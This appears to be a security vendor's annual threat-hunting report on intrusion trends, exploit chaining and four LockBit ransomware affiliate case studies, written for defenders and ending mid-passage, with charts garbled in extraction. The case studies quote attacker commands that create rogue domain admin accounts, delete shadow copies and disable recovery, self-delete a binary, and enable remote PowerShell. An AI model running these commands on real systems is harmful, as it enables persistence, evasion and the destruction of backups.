This has contributed to wide variations\n\nin eCrime affiliate tradecraft with threat hunters becoming skilled at\n\nidentifying diverse patterns of adversary tradecraft that preceded the\n\ndeployment of RaaS tooling.\n\nThis report’s retrospective concludes with a comprehensive look at\n\nthe tools adversaries are leveraging. This includes an examination\n\nof emerging tools, trending tools and the tools that have remained\n\npersistently popular in adversary arsenals.\n\n2 For information on the CrowdStrike Threat Graph, see:\n\n\n-----\n\n###### A Note\n to the Reader\n\n This report’s findings relate to interactive (i.e., hands-on) targeted[3] and eCrime intrusions that OverWatch tracks and do not necessarily represent the full spectrum of attacks that are stopped by OverWatch or the Falcon platform.\n\n Moreover, the term “intrusion” is used to describe any malicious interactive activity that OverWatch uncovers in a victim environment. Intrusion is not synonymous with a “breach” and should not be understood to mean that the threat actor was able to achieve their objectives.\n\n3 The term “targeted intrusion” in this\nreport refers to state-nexus or other\n\n\n###### Looking Deeper\n\nAs important as it is to look at trends, it is equally important to consider\n\noutliers. The report looks at some of the most novel and sophisticated\n\ntradecraft observed this year — evidence of adversaries’ enduring\n\n\ncapacity for innovation.\n\n\nThe technology sector remained a popular target for eCrime and\n\ntargeted intrusion adversaries alike. A featured case study examines the\n\narray of techniques used by AQUATIC PANDA to achieve persistence,\n\nsteal credentials and move around the victim network.\n\nHealthcare is another sector heavily impacted by interactive cyber\n\nintrusions this past year. The report looks at two interesting examples of\n\neCrime affiliate activity observed in the healthcare sector and recommends\n\nways defenders can bolster their security against similar activity.\n\nFinally, the report looks at the increase in the use of ISO files in phishing\n\nattacks by both targeted intrusion and eCrime adversaries.\n\n###### Looking Ahead\n\nThe report closes with a look at where threat hunting is headed into 2022\n\nand beyond. As the adoption of cloud-based technologies accelerates,\n\nso too does adversary interest in cloud-based resources. OverWatch\n\nis widening the aperture to capture this new direction in adversary\n\ntargeting. The report looks at cloud-based intrusions that OverWatch\n\nand the CrowdStrike Services team handled this year and provides\n\ninsights into how interactive threats are playing out in this arena.\n\nIn looking to the future, the report also details the patented technology\n\nthat underpins OverWatch’s hunting capability and makes it possible to\n\neffectively scale human-driven insights.\n\n\n-----\n\n### Interactive Intrusion Trends\n\n###### Intrusion Campaign Numbers\n\nOver the past year, OverWatch observed a near 50% increase in interactive intrusion campaigns. In the most recent quarter,\n\nfrom April to June 2022, OverWatch uncovered more intrusion campaigns than in any previous quarter.\n\n###### Intrusion Campaigns by Threat Type\n\n July 2020 to June 2021 vs. July 2021 to June 2022\n\n\nTargeted 18%\n\n\nHacktivist 1%\n\n\nHacktivist 1%\n\n\n###### +50%\n\n\neCrime 46%\n\n**eCrime**\nFinancially motivated\ncriminal intrusion activity\n\n\n###### 2022\n\nUnattributed 38%\n\n\nTargeted 14%\n\n###### 2021\n\n\nTargeted\n\n\n**Targeted**\nState-nexus intrusion\nactivity that includes cyber\nespionage, destructive\nor disruptive attacks, and\ncurrency generation to\nsupport a regime\n\n\n###### 2022\n\neCrime 43%\n\n\n14%\n\n\n**Hacktivist**\nIntrusion activity undertaken\nto gain momentum, visibility\nor publicity for a cause or\nideology\n\n\n46%\n\nTargeted\n\n###### 2021\n\n\nUnattributed 39% Unattributed 38%\n\n\n**Unattributed**\nInsufficient data available\nfor high-confidence\nattribution\n\n\n-----\n\n###### Intrusions\n by Threat Type\n\nOf the intrusions where attribution was possible, financially motivated eCrime activity\n\nwas again the dominant threat type. As shown in Figure 1, eCrime accounted for 43% of\n\nthe interactive intrusion activity, while targeted intrusions increased to 18% and hacktivist\n\nactivity made up 1%; the remaining 38% of intrusions were unattributed. It is important to\n\nnote that the figures shown in Figure 1 differ from past reporting due to the inclusion of the\n\nunattributed intrusion data.\n\n###### Unattributed but Not Underestimated\n\nOverWatch decided to report publicly on unattributed intrusion activity in this year’s\n\nreport because unattributable activity has been growing in prevalence year-over-year.\n\nFor organizations to make informed and proactive decisions about security, it is crucial\n\nthat defenders not only be aware of well-defined threats but also remain alert to the risk of\n\nemerging and unknown threats.\n\nIt is important to note that CrowdStrike does not rush to attribution. In many cases,\n\nOverWatch intercepts adversary activity during the very early stages of an attempted\n\nintrusion. In such cases, there are often few identifiable artifacts or examples indicative\n\nof tradecraft to investigate, which prevents high-confidence attribution. This issue is\n\ncompounded by the continued blurring of the lines between eCrime and targeted intrusion\n\ntradecraft and tooling, which also curtails high-confidence attribution. Moreover, the\n\nmotivations underlying intrusion activity are complex and diverse, and the paths that\n\nadversaries take to advance their mission can be indirect and inventive — one intrusion\n\nattempt in isolation may not reveal the full extent of an adversary’s motivations.\n\nOrganizations would be mistaken to believe that the threats they face are predictable.\n\nConsidering the unknown is a cornerstone of OverWatch’s proactive hunting strategy.\n\nRather than making assumptions about adversary motivations, OverWatch hunts for any\n\nand all evidence of post-exploitation activity across its global customer data set to provide\n\nproactive coverage against both known and unknown threats.\n\n\n-----\n\n###### Intrusions by Industry Vertical\n\nNotably, in this past year OverWatch uncovered interactive intrusion activity spanning 37 distinct industries — proof that no\n\nindustry is immune, and evidence of the importance of remaining vigilant.\n\nFigure 2 shows the relative frequency of intrusions for the top 10 industry verticals in which OverWatch uncovered interactive\n\nintrusion activity last year. This is compared with the relative frequency of intrusions in each industry vertical in the last\n\nreporting period. Figure 3 shows the top five industry verticals split out by threat type, illustrating where eCrime and targeted\n\nintrusion adversaries were most active.\n\n###### Top 10 Verticals by Intrusion Frequency\n\n July 2021 to June 2022 vs. July 2020 to June 2021\n\n Technology\n\n Telecommunications\n\n Manufacturing\n\n Academic\n\n Healthcare\n\n Financial\n\n Retail\n\n Government\n\n Pharmaceutical\n\n July 2021 to June 2022\n Media July 2020 to June 2021\n\n 0% 5% 10% 15% 20%\n\n**Figure 2. The figure shows which industry verticals globaly were most frequently impacted by interactive intrusions in the past year and**\n\n|Col1|Col2|July 2021 to July 2020 to|June 2022 June 2021|\n|---|---|---|---|\n\n\n-----\n\nTechnology was once again in the top spot, remaining a popular target for eCrime and targeted intrusion adversaries alike.\n\nThe technology sector plays a critical role in supporting the operations of organizations across almost all other sectors;\n\nthis reliance has increased in the wake of COVID-19 and the need to establish remote operations. Targeted intrusion\n\nadversaries may pursue technology companies to fulfill strategic, military, economic or scientific collection requirements,\n\nor as part of efforts to compromise supply chains or trusted relationships. Because of the potential value of data owned by\n\ntechnology companies and their vulnerability to disruption, they are also a sought-after target for ransomware campaigns by\n\neCrime adversaries. The telecommunications industry remained in second place, driven in large part by targeted intrusion\n\nadversaries that conduct operations against telecommunications providers, likely to fulfill their surveillance, intelligence and\n\ncounterintelligence collection priorities.\n\nNotable changes in this year’s list include increased activity against the healthcare and academic industries. This year, intrusions\n\nin the healthcare industry were predominantly carried out by eCrime adversaries (eCrime affiliate activity against the healthcare\n\nindustry is explored in detail later in this report). In contrast, last year, OverWatch reported a significant amount of targeted\n\nintrusion activity against the healthcare industry, particularly related to involvement in COVID-19 related research. Looking at the\n\nacademic industry, OverWatch uncovered eCrime, hacktivist and targeted intrusion activity across the sector. The academic\n\nindustry has a broad attack surface due to the nature of its users and operations, and is also a potentially high-value target for\n\nstate-nexus adversaries because universities and academic institutions often possess intellectual property, and individuals of\n\ninfluence can be among their academic staff and alumni.\n\n###### Top 5 Verticals by Intrusion Frequency\n\n eCrime Activity vs. Targeted Intrusions: July 2021 to June 2022\n\n\n###### 10%\n 8%\n 7%\n 6%\n\n 14%\n 9%\n 5%\n 4.5%\n\n\n###### 21%\n\n\n###### eCrime\n\n Targeted Intrusions\n\n**Figure 3. \u0007**\n\n\nTechnology\n\nManufacturing\n\nHealthcare\n\nRetail\n\nFinancial\n\nTelecommunications\n\nTechnology\n\nGovernment\n\nAcademic\n\nMedia\n\n\n###### 37%\n\n\n-----\n\n###### Adversary Activity\n\nIn the past year, OverWatch uncovered interactive intrusion activity\n\nconducted by 36 distinct named threat actors, spanning seven groups:\n\nBEAR (Russia), CHOLLIMA (North Korea), JACKAL (hacktivist),\n\nKITTEN (Iran), PANDA (China), SPIDER (eCrime) and WOLF (Turkey).[4]\n\nThese naming conventions are instituted by CrowdStrike to categorize\n\nadversaries according to their nation-state affiliations or motivations.\n\nFigure 4 provides a breakdown of the threat groups observed by\n\nOverWatch.\n\n###### eCrime\n\nOf attributable intrusions, OverWatch tracked 12 named eCrime (aka\n\nSPIDER) threat actors; of these, PROPHET SPIDER was the most\n\nprolific, responsible for more than twice as many attributed interactive\n\nintrusions than the next most active eCrime actor, CARBON SPIDER.\n\nPROPHET SPIDER is likely an access broker — an actor that gains\n\naccess with the intention to sell that access for profit rather than carrying\n\nout actions on objectives directly. Were it not for OverWatch alerting\n\nvictim organizations to these PROPHET SPIDER intrusions, they likely\n\nwould have progressed to a ransomware incident or breach.\n\n###### Of the hands-on eCrime ECrime adversaries remain highly capable, particularly if measured by intrusion activity last year the speed at which they can move through a victim’s environment. An where breakout time could be important OverWatch speed measurement is breakout time: the time derived, the average was just an adversary takes to move laterally, from an initially compromised host 1 hour 24 minutes. Moreover, to another host within the victim environment. Of the hands-on eCrime the OverWatch team found\n\nintrusion activity last year where breakout time could be derived, the\n\n###### that in 30% of those eCrime\n\naverage was just 1 hour 24 minutes.

Heat map of intrusion campaigns by adversary group and industry vertical, July 2021 to June 2022**\n\nA few things to note about the data presented in Figure 4:\n\nThe heat mapping represents the number of distinct actors active within a particular vertical.\n###### +\nThe heat mapping does not represent the total number of intrusion attempts within a vertical, as multiple\n###### +\nintrusions by the same adversary group are only represented once.\n\nAttribution to a high degree of confidence is not always possible. This table does not reflect any unattributed\n###### +\nactivity that occurred in any of the industry verticals.\n\nVerticals not listed indicate that OverWatch recorded no intrusions attributable to a specific actor group during\n###### +\nthis period.\n\n\n-----\n\n###### Adversary\n Technique Insights\n\nOverWatch carefully documents the details of each intrusion it uncovers, building a rich data\n\nset of adversary activity. With each new intrusion, threat hunters create a sharper picture of\n\nthe threat landscape and tradecraft of adversaries that inhabit it — better equipping defenders\n\nto take a proactive and evidence-informed approach to protecting their environment. The\n\nfollowing analysis draws on OverWatch’s rich repository of intrusion data collected over the\n\npast year.\n\n###### MITRE ATT&CK Heat Map\n\nOverWatch tracks interactive intrusion activity against the MITRE ATT&CK® Enterprise\n\nMatrix — a framework to categorize and track adversary behavior.[5]\n\nThe following heat map illustrates the prevalence of adversary tactics, techniques,\n\nsub-techniques and tools observed last year by OverWatch threat hunters. The heat\n\nmap reflects the most current MITRE naming conventions for techniques and sub-\n\ntechniques.\n\nAs stated previously, this heat map represents activity seen in interactive intrusions only\n\nand does not reflect the breadth of activity seen and stopped by the Falcon platform.\n\nThis table excludes any techniques or sub-techniques not observed by OverWatch in\n\nthis reporting period.\n\nNotably, this year saw a shift in the persistence techniques favored by adversaries\n\ncompared to the previous year, with increases seen in adversaries’ use of both server\n\nsoftware components — particularly web shells — and IIS components.\n\nOther than these slight shifts in persistence techniques, much of this year’s heat\n\nmap reflects the previous year’s. Exploiting public facing infrastructure, abusing\n\nremote services (particularly RDP), dumping OS credentials and accessing unsecure\n\ncredentials all remain popular and heavily represented in this year’s heat map.\n\n\n-----\n\nInitial Access Execution Persistence Privilege Escalation\nTechnique Sub-technique Technique Sub-technique Technique Sub-technique Technique

behavior is key to formulating\n\nan effective and proactive defense into the future. Looking back over the\n\npast year, several trends stand out to OverWatch threat hunters.\n\nThere was a continued shift from malware use, with malware-free\n\nactivity accounting for 71% of all detections indexed by CrowdStrike\n\nThreat Graph®. This is related, in part, to adversaries’ prolific abuse\n\nof valid credentials to facilitate access and persistence in victim\n\nenvironments. Another contributing factor is the rate at which new\n\nvulnerabilities are being disclosed and the speed with which adversaries\n\nare able to operationalize exploits. Many organizations are finding\n\nthemselves behind the 8-ball, unable to keep up with the pace at which\n\nthese new threats are emerging. Rather than looking for fires, defenders\n\nneed to learn to smell the smoke — to search for patterns of post\nexploitation activity, which is proven effective in detecting early evidence\n\nof threats stemming from both known and unknown vulnerabilities.\n\nAs part of the ongoing effort to understand the behaviors of adversaries,\n\nOverWatch has been closely tracking the diversification of ransomware\n\naffiliates’ tradecraft. In particular, the LockBit RaaS program has attracted\n\na vast array of affiliates. This report shares the details of four distinct\n\nLockBit intrusions uncovered last year by OverWatch, providing insights\n\ninto the commonalities and differences in adversary tradecraft that can\n\nexist around a single piece of malware.\n\nThe final part of this section examines some of the tools that OverWatch\n\nencountered over the past year. This starts with a look at emerging\n\ntools that, though not highly prevalent across our data set, offer clues\n\ninto where adversaries are turning their attention. Next is an exploration\n\nof trending tools that defenders should watch for as they have been\n\ncommonly observed in OverWatch’s data set. Finally, the report looks at\n\nthe tools that have become mainstays of the adversary toolkit.\n\n\n-----\n\n###### Looking Beyond\n the CVE\n\nThe number of zero-days and newly disclosed CVEs continued to\n\nrise year-over-year; concurrently, the time narrowed between the\n\ndisclosure of these vulnerabilities and active exploitation attempts\n\nbeing observed in the wild.[6]\n\nOrganizations worldwide are grappling with a seemingly limitless\n\nonslaught of new vulnerabilities. Many organizations get caught in\n\na reactive cycle of putting out the fires of individual vulnerabilities in\n\nthe short term, while failing to adequately address the risks of these\n\nvulnerabilities in the long term. As a result, legacy vulnerabilities\n\noften remain unpatched, leaving organizations susceptible to exploit\n\nchaining in which adversaries combine newly publicized vulnerabilities\n\nwith older, overlooked exploits.\n\nWhile this situation may seem insurmountable, defenders have one\n\nvery important fact on their side: Adversaries frequently adhere to\n\ncommon patterns of post-exploitation tradecraft. Threat hunters are\n\ntherefore able to uncover malicious activity regardless of the initial\n\naccess vector, effectively disarming the CVE or zero-day exploit.\n\nNever before has it been more important for defenders to pivot\n\nfrom focusing on assessing and improving detection and mitigation\n\ncapabilities to seeking proactive hunting solutions capable of\n\naddressing threats at scale.\n\n6 The CrowdStrike 2022 Global Threat Report detailed Chinese actors’\nexploit-acquisition capabilities, particularly against Microsoft Exchange vulner­\nabilities and other enterprise software hosted on internet-facing servers. For\nmore information about the China-nexus vulnerability exploitation view, see the\n\n\n-----\n\n##### 20,000+\n\n###### new vulnerabilities reported in 2021\n\n##### 10,000+\n\n###### new vulnerabilities reported as of the start of June 2022\n\n\n###### New CVEs, Same Old Tricks\n\nThe number of new vulnerabilities reported in 2021 exceeded 20,000,\n\nsurpassing any previous year.[7] There is no sign of this abating in 2022,\n\nwith over 10,000 new vulnerabilities reported as of the start of June\n\n2022. While the specific vulnerability exploited varies, the post\nexploitation tradecraft and behaviors observed by OverWatch often\n\nremain similar.\n\nExamining the tactics, techniques and procedures (TTPs) deployed\n\nduring hands-on intrusions reveals common patterns of activity.\n\nSuccessful exploitation is routinely followed by the deployment of web\n\nshells, which are subsequently used to conduct discovery operations,\n\nharvest credentials, and retrieve and execute remotely hosted tooling.\n\nTimely and comprehensive patching continues to play a crucial role\n\nin preventing successful exploitations. However, this solution is not\n\nalways immediately available to defenders, particularly in the case\n\nof unknown or very recently disclosed CVEs. Augmenting robust\n\nsecurity hygiene practices with around-the-clock hunting shifts\n\nthe defensive mindset from chasing individual vulnerabilities to\n\nidentifying known bad behaviors. This provides security teams with a\n\nvital advantage in the ability to identify and disrupt hands-on activity\n\nassociated with the exploitation of unpatched or as-yet-unknown\n\nvulnerabilities.\n\n###### Outpacing the Zero-Day with Proactive Hunting\n\nOn June 2, 2022, a newly discovered Confluence vulnerability,\n\nallowing unauthenticated remote code execution (RCE) on a\n\ncompromised host, was publicly disclosed. Proof of concept (POC)\n\ncode quickly emerged, alongside public reporting noting active\n\nexploitation attempts from both criminally motivated and targeted\n\nintrusion actors.\n\n7 For data on the distribution of vulnerabilities over time, see the National\n[­Vulnerability Database: https://nvd.nist.gov/general/visualizations/vulnerability-](https://nvd.nist.gov/general/visualizations/vulnerability-visualizations/cvss-severity-distribution-over-time)\n\n\n-----\n\nWhile defenders scrambled to mitigate the risks of this CVE in the\n\nabsence of an immediate patch, OverWatch for several days had\n\nalready been notifying victim organizations of observed malicious\n\nactivity consistent with a web service compromise, providing them with\n\nthe actionable context needed to disrupt the adversary. In late May\n\n2022, approximately one week prior to the vulnerability disclosure,\n\nOverWatch began observing hands-on malicious activity on Linux hosts\n\nat entities spanning numerous industry sectors including technology\n\nand academia. This activity included web shell deployment, interactive\n\nreconnaissance, attempted credential harvesting and the retrieval of\n\nremotely hosted tooling. By virtue of OverWatch’s focus on hands-on,\n\npost-exploitation behaviors rather than hunting specific CVEs, impacted\n\norganizations were provided with actionable and timely context that\n\nallowed for early disruption of the adversary activity. This is a clear\n\nillustration of how behavior-based proactive hunting provides earlier and\n\nmore comprehensive coverage than more targeted efforts to mitigate\n\nCVEs as they come to light.\n\n###### Bad Things Come in Threes\n\nAs seen above, adversaries are quick to exploit new vulnerabilities, but\n\nthey are equally eager to capitalize on vulnerabilities that persist as a\n\nconsequence of patching delays.\n\nAs part of the prolonged targeting of Microsoft Exchange servers over\n\nthe last year, OverWatch observed adversary use of exploit chaining.\n\nOf note is the ProxyShell exploit chain in which three discrete CVEs\n\n(CVE-2021-34473,[8] CVE-2021-34523[9] and CVE-2021-31207[10]) are\n\nchained to achieve RCE capabilities, escalate privileges and enable\n\nauthentication bypass on vulnerable systems. The practice of exploit\n\nchaining enables adversaries to reach their objectives quickly, allowing\n\nthem to outmaneuver defenders that continue to focus on reactively\n\nmitigating individual vulnerabilities. Such an approach does little to\n\ncurtail a determined adversary that will simply pivot if one exploit attempt\n\nproves unsuccessful.\n\n8 For more information on this vulnerability, see:\n[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473.](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473)\n\n9 For more information on this vulnerability, see:\n[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523.](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523)\n\n10 For more information on this vulnerability, see:\n\n\n-----\n\nNotably, while the ProxyShell vulnerabilities were disclosed in the first half of 2021, OverWatch has continued to observe\n\nnumerous instances of attempted exploitation deep into 2022. It is telling of the defensive challenges facing organizations\n\nthat even 12 months on, adversaries continue to have success with older, widely publicized and patchable exploits.\n\nSpecifically, the ProxyShell exploit chain has been leveraged by both eCrime and state-nexus actors, including CARBON\n\nSPIDER and NEMESIS KITTEN, respectively. These intrusion attempts were carried out against entities operating across\n\na range of industry verticals including government, healthcare, and manufacturing and spanning multiple regions. However,\n\nlooking more closely at the post-exploitation behavior again revealed a common combination of adversary techniques, as\n\nshown in the image below:\n\n\nINITIAL ACCESS EXECUTION PERSISTENCE\n\n\nCREDENTIAL ACCESS DISCOVERY\n\n\nCOMMAND & CONTROL\n\nRetrieval and\ndeployment of\nactor tooling from\nremote locations\n\n\nDEFENSE EVASION\nDisabling Windows\nDefender and\nmasquerading\nmalicious binaries\n\n\nA variety of\ncredential dumping\ntechniques\n\n\nMS Exchange\nexploitation\n\n\nExchange\nenumeration\nand host\nreconnaissance\n\n\nPowerShell\n\n\nWeb shell\ndeployment\n\n\n###### Action Items for Defenders\n\nInvest in scalable defense solutions that allow your organization to look beyond the CVE or zero-day. As we look to the\n\nend of 2022 and beyond, the profusion of CVEs and their rapid exploitation by adversaries is a trend that shows no signs\n\nof slowing. It is no longer feasible for defenders to tackle these vulnerabilities in isolation, nor advisable to ignore them in\n\naggregate. Organizations must adopt a security solution that can scale effectively. Threat hunting offers this solution, keeping\n\norganizations informed of active threats to their security by focusing on the post-exploitation behaviors that remain constant\n\nrather than vulnerabilities that remain in flux.\n\n\n-----\n\n###### LockBit and Its Technicolor\n Affiliate Program: How One\n RaaS Offering Has Spawned\n Diverse Tradecraft\n\nThe proliferation of eCrime activity has been a constant theme over the last\n\nseveral years. The growth of the eCrime ecosystem is characterized by a vast\n\narray of threat actors and the rapid innovation in adversary tradecraft designed\n\nto maximize profits. As a result, threat hunters now more than be familiar with a\n\ndiverse range of adversary tradecraft and expect the unexpected.\n\n\n###### Verticals Impacted by LockBit from July 1, 2021,\n to June 30, 2022:\n\n Retail\n\n Healthcare\n\n Transportation\n and Logistics\n\n Academic\n\n Manufacturing\n\n Professional\n Services\n\n Telecommunications\n\n Technology\n\n\n[Ransomware as a service (RaaS) affiliate models have exacerbated](https://www.crowdstrike.com/cybersecurity-101/ransomware/ransomware-as-a-service-raas/)\n\nthis situation. There is a common misconception that ransomware\n\nevents follow a single pattern. In reality, different affiliate groups often\n\nuse distinct tradecraft to deploy the same tooling. This makes threat\n\nhunters’ job of identifying early stages of ransomware preparation more\n\ncomplex, requiring awareness of a vast array of intrusion tactics and\n\nmethodologies leveraged by affiliates.\n\nTo demonstrate exactly how the strategy of different affiliates can vary,\n\nthe following analysis examines four distinct LockBit intrusions from last\n\nyear. Because of its popularity and reputation, LockBit has an extensive\n\naffiliate program. Each case study details the notable TTPs used by affiliates\n\nand highlights key similarities and differences, providing security teams\n\nwith insight into the operational effort of tracking today’s diverse eCrime\n\nadversaries and the additional controls that should be applied to mitigate\n\nagainst observed tradecraft. While not explicitly called out in each intrusion\n\ncase study, readers should note that, when correctly configured, the Falcon\n\nplatform will prevent the execution of the LockBit and StealBit binaries.\n\nThe intrusions discussed here impacted organizations in the retail,\n\nhealthcare, and transportation and logistics industry verticals.\n\nLockBit was one of the most prolific ransomware families over the last\n\nyear, measured both by activity on their dedicated leak site and by\n\nOverWatch data on interactive intrusion campaigns. OverWatch also\n\nobserved LockBit in other sectors including academia, manufacturing,\n\n\n-----\n\n###### INITIAL ACCESS\n\nAffiliate gains\naccess via VPN\n\n###### LATERAL MOVEMENT\n\nAffiliate uses RDP\nto move laterally\naround the\nnetwork\n\n###### IMPACT\nAffiliate attempts to\nremove backups\nand inhibit system\nrecovery\n\n\n###### PERSISTENCE\nAffiliate creates a\nnew account and\nassigns it to domain\nadmin group\n\n###### EXECUTION\n\nAffiliate attempts to\nexecute tooling via\nscheduled tasks\n\n\n###### Scenario 1\n\n VPN Compromise and Tools-A-Plenty\n\nIn Q3 2021, OverWatch observed an interactive intrusion stemming from\n\na compromised VPN appliance. The LockBit affiliate leveraged a valid\n\nuser account to begin ransomware preparation activity. They pivoted to a\n\ndomain controller via RDP and created a new generically named domain\n\nadministrator account, which they granted privileged access. The newly\n\ncreated account was given a keyboard run password that was seen\n\nagain in the intrusion described in Scenario 3. The affiliate leveraged the\n\nnew account to move rapidly to other hosts in the environment including\n\nbackup servers.\n\nNewly created account:\n\nnet user admina [REDACTED] /domain /add\n\nnet group “domain admins” admina /add /domain\n\nThe affiliate downloaded tooling associated with rootkit removal that\n\nis frequently abused by eCrime operatives in attempts to modify and\n\ndisable security tooling. They used a variety of locations, listed below, to\n\nstage and execute their malicious tooling.\n\nList of tools and staging locations used by the affiliate:\n\n\\Users\\[REDACTED]\\Desktop\\PCHunter64.exe\n\n\\Users\\[REDACTED]\\Downloads\\YDArk-master.zip\n\n\\Users\\[REDACTED]\\Downloads\\CleanWipe.exe\n\n\\Users\\[REDACTED]\\AppData\\Local\\Temp\\3\\\nRar$EXa1280.11181\\4xnkw4ie.exe (renamed GMER TOOL)\n\nAt one point, the affiliate tried to use scheduled tasks to execute the\n\nCleanWipe tool, which is designed to remove a third-party security tool:\n\nC:\\Windows\\system32\\schtasks.exe /create /tn “[REDACTED]\nCleanWipe” /tr “\\”C:\\Users\\[REDACTED]\\Downloads\\\nCleanWipe.exe\\” --scheduler” /sc ONSTART /ru System\n\nThe affiliate proceeded to deploy and execute a StealBit binary, using\n\nit to target a design software database.

While LockBit ransomware is available to all, StealBit is only available to vetted affiliates.\n\n\nFinally, the affiliate attempted to remove volume shadow copies and\n\ndisable system recovery:\n\n“C:\\Windows\\System32\\cmd.exe” /c vssadmin delete\nshadows /all /quiet & wmic shadowcopy delete & bcdedit\n/set {default} bootstatuspolicy ignoreallfailures &\nbcdedit /set {default} recoveryenabled no\n\nTo proactively hunt for this type of intrusion, defenders should watch for:\n\nNew generic accounts being created and added\n\nto privileged groups\n\nCreation of scheduled tasks that are unique to the organization\n\nRDP sessions between critical hosts (domain controllers,\n\nbackup servers)\n\nUnexpected execution of vssadmin and shadowcopy\n\ncommands\n\n\ncommands\n\n\n-----\n\n###### Scenario 2\n\n RDP Brute-force Leads to Ransomware Delivery Against Windows Workstation Host\n\nDuring Q4 2021, OverWatch hunters discovered an affiliate carrying\n\nout the early stages of a ransomware attack. Unusually, the activity was\n\nlimited to a single Windows 10 workstation. The affiliate gained access to\n\nthe host following a suspected brute-forcing of credentials for a publicly\n\nexposed RDP session. Once on the workstation, they quickly shifted to\n\naction-on-objectives — only light reconnaissance was observed and the\n\naffiliate made no effort to move laterally. Notable tradecraft in this intrusion\n\nincluded the use of a low-prevalence intermediate binary to deliver and\n\nattempt execution of both a LockBit binary and a separate screenlocker\n\ntool. The affiliate then leveraged the RDP session to transfer the low\nprevalence binary to the \\%Users%\\Desktop directory; when executed, it\n\nfetched and executed the additional tooling. The intermediate ransomware\n\nrunner binary also contained capabilities to remove itself from the system\n\nafter executing. This was achieved by leveraging the Windows choice[11]\n\ncommand to execute a hard-coded internal batch script that deletes the\n\nrunner binary from the system. This is likely part of the affiliate’s defense\n\nevasion strategy, seeking to evade automated defenses by using an\n\nintermediate tool to deploy and execute ransomware, while ensuring the\n\nrunner tool is removed to avoid analysis.\n\nThe affiliate conducted light reconnaissance using system commands:\n\nC:\\WINDOWS\\system32\\cmd.exe /c hostname\n\nC:\\WINDOWS\\system32\\cmd.exe /c wmic computersystem get name\n\nThe affiliate leveraged the choice command before deleting itself:\n\n“C:\\Windows\\System32\\cmd.exe” /C choice /C Y /N /D Y /T 3 & Del\n\n“C:\\Users\\[REDACTED]\\Desktop\\[REDACTED].exe”\n\nTo proactively hunt for this type of intrusion, defenders should watch for:\n\nA high volume of unsuccessful logons followed by a successful logon,\n\nindicative of a potential brute-force attack\n\nRDP sessions established from an external IP\n\nUnusual binaries written to a user desktop\n\nAbuse of system binaries, such as wmic and choice, to conduct activity\n\n11 [https://docs.microsoft.com/en-us/windows-server/administration/windows-](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/choice)\n\n\n###### DISCOVERY\n\nAffiliate\nconducts light\nreconnaissance\nusing\nsystem tools\n\n\n###### INITIAL ACCESS\nAffiliate gains\naccess to an RDP\nsession via\nbrute-force\n\n###### DEFENSE EVASION\nAffiliate uses an\nintermediate tool to\ndeploy ransomware.\nThe tool deletes itself\nafter execution\n\n|Col1|Col2|\n|---|---|\n||INITIAL Affiliat acces sessio brute-|\n|VERY liate light ance sing tools||\n||DEFENS Affiliat interm deplo The to after e|\n\n|e Leads|to Ranso station H rs discovere re attack.

The affiliate\n\ncreated a generically named user account together with the same\n\npreviously seen keyboard run password. They added the account to\n\nthe domain and enterprise admin groups. Operating once again from a\n\nsuspected compromised VPN appliance, the affiliate this time opted to\n\nuse the Windows Management Interface (WMI) to orchestrate activity\n\nagainst a domain controller.\n\nThe affiliate created account over WMI:\n\ncmd.exe /Q /c net user audit [REDACTED] /add /domain\n1> \\\\127.0.0[.]1\\ADMIN$\\__[REDACTED] 2>&1\n\nA newly created account was added to the Domain Admins group:\n\ncmd.exe /Q /c net group “domain admins” audit /add /\ndomain 1> \\\\127.0.0[.]1\\ADMIN$\\__[REDACTED] 2>&1\n\nA newly created account was added to the Enterprise Admins group:\n\nCMD: cmd.exe /Q /c net group “enterprise admins”\naudit /add /domain 1> \\\\127.0.0[.]1\\ADMIN$\\__\n\n[REDACTED] 2>&1\n\nNext the affiliate switched to using RDP and used the newly created\n\naccount to connect to the domain controller and move laterally to a\n\nbackup server, leveraging RDP sessions to conduct further activity\n\nincluding deploying additional tooling. Unlike in Scenario 1, this time\n\nthe adversary favored the \\%User%\\Downloads directory to stage\n\ntools. The choice of tooling was also different; on this occasion the\n\nadversary leveraged the netscan tool, often seen in pre-ransomware\n\nactivity, to map the domain. After completing a network scan, the\n\nadversary wrote a suspected LockBit binary to the same directory.\n\nThe affiliate downloaded and executed netscan:\n\nC:\\Users\\audit\\Downloads\\scan\\netscan.exe\n\nThe affiliate downloaded LockBit:\n\nC:\\Users\\audit\\Downloads\\LockBit 17DE44B4D0BB157C exe\n\n|Col1|Col2|\n|---|---|\n|CCESS gains a VPN||\n||LATERA Affiliate WMI c to mov to othe LATERA Affiliat hosts u and R domai backu|\n|TENCE ates a nt and omain group||\n|OVERY twork o map omain||\n\n\n-----\n\n###### INITIAL ACCESS\n\nAffiliate gains\naccess\nwith valid\naccounts\n\n###### DEFENSE EVASION\nAffiliate modifies\nthe registry to\nenable inbound\nRDP sessions\nfrom external\nsources\n\n###### EXFILTRATION\n\nAffiliate\nattempts to\nexfiltrate data\nusing custom\nStealBit\nmalware,\nWinSCP and\nPuTTY\n\n\n###### LATERAL MOVEMENT AND EXECUTION\n\nAffiliate\nleverages RDP\nbetween internal\nhosts and\nenables\nPowerShell\nremoting for\ncommand\nexecution\n\n###### DISCOVERY\nAffiliate conducts\nextensive\ndiscovery activity,\ntesting host and\nnetwork\nconnectivity and\nhunting for\ndocuments\ncontaining sensitive\ninformation\n\n\nTo proactively hunt for this type of intrusion, defenders should watch for:\n\nNewly created privileged accounts over WMI\n\nNetwork scans/scanning tools\n\nInteractive logon to a backup server from a new account\n\nUnexpected RDP sessions to critical servers\n\n###### Scenario 4\n\n Living off the Land for Data Theft\n\nIn contrast to the other case studies explored here, this intrusion from Q1\n\n2022 exhibited tradecraft consistent with longer-term data theft objectives.\n\nOverWatch observed an affiliate attempting data theft using the StealBit\n\ndata exfiltration tool. The affiliate used RDP to move laterally between a\n\nnumber of internal hosts and leveraged valid credentials to carry out their\n\nobjective. On this occasion, the affiliate also queried specific Windows\n\nregistry entries and modified registry settings to enable inbound RDP and\n\nallow PowerShell remoting.\n\nThe affiliate established RDP sessions with other hosts and enabled\n\nPowerShell remote sessions:\n\nmstsc /v: [REDACTED]\n\nwmic /node:“[REDACTED]” process call create “power­\nshell Enable-PSRemoting -Force -SkipNetworkProfileCh­\neck”\n\nThe affiliate enabled RDP via the 